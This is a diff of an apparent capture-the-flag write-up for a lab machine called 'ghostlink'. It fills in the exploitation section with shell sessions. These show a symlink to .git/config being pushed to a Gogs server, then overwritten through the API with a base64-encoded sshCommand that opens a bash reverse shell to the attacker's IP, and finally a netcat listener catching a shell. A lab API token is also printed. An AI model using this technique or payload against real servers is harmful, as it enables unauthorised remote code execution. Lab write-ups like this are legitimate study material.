@@ -779,24 +779,105 @@ Archive:  db.zip
                                                
 ```
 
+vroth creds
+
 ---
-## Foothold
-
-How you gained initial access to the machine.
-
-### Vulnerability
-
-Description of the vulnerability exploited.
-
 ### Exploitation
 
 Step-by-step exploitation with commands.
 
 ```shell
-# Commands used
+git clone http://gpz-op26-toolkits.ghostlink.htb/vroth/rce.git 
+Cloning into 'rce'...
+warning: You appear to have cloned an empty repository.
+hint: Using 'master' as the name for the initial branch. This default branch name
+hint: will change to "main" in Git 3.0. To configure the initial branch name
+hint: to use in all of your new repositories, which will suppress this warning,
+hint: call:
+hint:
+hint:   git config --global init.defaultBranch <name>
+hint:
+hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
+hint: 'development'. The just-created branch can be renamed via this command:
+hint:
+hint:   git branch -m <name>
+hint:
+hint: Disable this message with "git config set advice.defaultBranchName false"
 ```
 
-lfi
+```
+──(kali㉿kali)-[~/machines/ghostlink]
+└─$ cd rce                 
+                                                                                                                
+┌──(kali㉿kali)-[~/machines/ghostlink/rce]
+└─$ git init                                                      
+Reinitialized existing Git repository in /home/kali/machines/ghostlink/rce/.git/
+                                                                                                                
+┌──(kali㉿kali)-[~/machines/ghostlink/rce]
+└─$ ln -s .git/config link
+                                                                                                                
+┌──(kali㉿kali)-[~/machines/ghostlink/rce]
+└─$ git add link
+                                                                                                                
+┌──(kali㉿kali)-[~/machines/ghostlink/rce]
+└─$ git commit -m "add"                                           
+[master (root-commit) 75b0089] add
+ 1 file changed, 1 insertion(+)
+ create mode 120000 link
+                                                                                                                
+┌──(kali㉿kali)-[~/machines/ghostlink/rce]
+└─$ git push           
+Enumerating objects: 3, done.
+Counting objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 197 bytes | 197.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+Username for 'http://gpz-op26-toolkits.ghostlink.htb': vroth
+Password for 'http://vroth@gpz-op26-toolkits.ghostlink.htb': 
+To http://gpz-op26-toolkits.ghostlink.htb/vroth/rce.git
+ * [new branch]      master -> master
+                                                                              
+```
+
+```
+curl -s "http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/rce/contents/link" \
+  -H "Authorization: token c60a5d95cb04329a47df0a64275720cbf83c7216"
+{"type":"symlink","target":".git/config","size":11,"name":"link","path":"link","sha":"74a16c50bb417b927af27e37af24480f00ed5232","url":"http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/rce/contents/link","git_url":"","html_url":"http://gpz-op26-toolkits.ghostlink.htb/vroth/rce/src/master/link","download_url":"http://gpz-op26-toolkits.ghostlink.htb/vroth/rce/raw/master/link","_links":{"git":"","self":"http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/rce/contents/link","html":"http://gpz-op26-toolkits.ghostlink.htb/vroth/rce/src/master/link"}}                        
+```
+
+```
+curl -X PUT "http://gpz-op26-toolkits.ghostlink.htb/api/v1/repos/vroth/rce/contents/link" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: token c60a5d95cb04329a47df0a64275720cbf83c7216" \
+  -d '{
+    "message": "update",
+    "sha": "74a16c50bb417b927af27e37af24480f00ed5232",
+    "committer": {"name": "test", "email": "test@test.com"},
+    "content": "W2NvcmVdCiAgICAgICAgc3NoQ29tbWFuZCA9IGJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ4LzQ0NDQgMD4mMScKW3JlbW90ZSAib3JpZ2luIl0KICAgICAgICB1cmwgPSBnaXRAZ3B6LW9wMjYtdG9vbGtpdHMuZ2hvc3RsaW5rLmh0Yjp2cm90aC9yY2UuZ2l0Cg=="
+  }'
+{"message":"Something went wrong, please check the server logs for more information.","url":"https://github.com/gogs/docs-api"} 
+```
+
+shell as git
+
+```
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.148] from (UNKNOWN) [10.129.191.32] 49806
+bash: cannot set terminal process group (690): Inappropriate ioctl for device
+bash: no job control in this shell
+git@gpz-op26-toolkits:~/data/tmp/local-repo/10$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<10$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+bash: python3: command not found
+git@gpz-op26-toolkits:~/data/tmp/local-repo/10$ id
+id
+uid=1000(git) gid=1000(git) groups=1000(git)
+git@gpz-op26-toolkits:~/data/tmp/local-repo/10$ ls
+ls
+link
+git@gpz-op26-toolkits:~/data/tmp/local-repo/10$ 
+
+```
+
 
 ---
 ## User Flag
